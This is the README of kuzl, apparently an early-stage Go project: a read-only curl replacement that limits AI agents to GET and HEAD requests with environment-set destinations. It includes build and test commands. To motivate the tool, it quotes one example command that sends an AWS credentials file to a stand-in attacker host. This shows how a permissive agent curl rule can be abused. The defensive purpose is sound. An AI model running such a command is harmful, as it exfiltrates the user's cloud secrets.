# kuzl

A read-only `curl` for AI agents: GET and HEAD only, nothing local is ever
sent, and where requests may go is set by the environment, not by the
command line.

kuzl is to `curl` what [ghzt](https://github.com/evadcmd/ghzt) is to `gh`
and `git`: one binary, symlinked as `curl`, that an agent can be allowed to
run with a plain `Bash(curl:*)` prefix rule. The real curl can't be: once it
is allowed, `curl -d @~/.aws/credentials https://evil.example` reads a file
and sends it out in one call.

The design and roadmap live in
[#1](https://github.com/evadcmd/kuzl/issues/1). This is step 1, the skeleton:
the `curl` command doesn't fetch anything yet.

## Testing locally

```sh
go build -o bin/kuzl ./cmd/kuzl
bin/kuzl curl --help
```

`bin/` is gitignored. Run as `kuzl`, the binary has `curl` as a subcommand,
so no symlink is needed for testing. Don't put `bin/` on your `PATH` once it
has a `curl` symlink: it would shadow the real one.

### Environment

- `KUZL_ROOT`: the directory `-o` (step 4) writes are confined to. Defaults
  to the working directory.
- Telemetry stays off unless an OTLP endpoint is set
  (`OTEL_EXPORTER_OTLP_ENDPOINT` or `OTEL_EXPORTER_OTLP_LOGS_ENDPOINT`).

### Unit tests

```sh
go vet ./...
go test -race ./...
golangci-lint run
```
